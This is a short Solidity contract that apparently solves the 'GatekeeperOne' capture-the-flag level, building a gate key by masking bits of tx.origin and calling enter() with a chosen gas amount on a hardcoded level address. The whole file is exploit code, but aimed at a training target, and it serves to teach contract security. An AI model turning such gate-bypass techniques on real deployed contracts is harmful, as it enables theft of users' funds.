// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGateKeeperOne {
    address levelInstance = address(0x58A799F34A15be35FF2C6E5039a5CE120583Dc29);

    constructor() {
    }

    function open(uint32 _gasPrice) public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        IGatekeeperOne(levelInstance).enter{gas: _gasPrice}(key);
    }
}
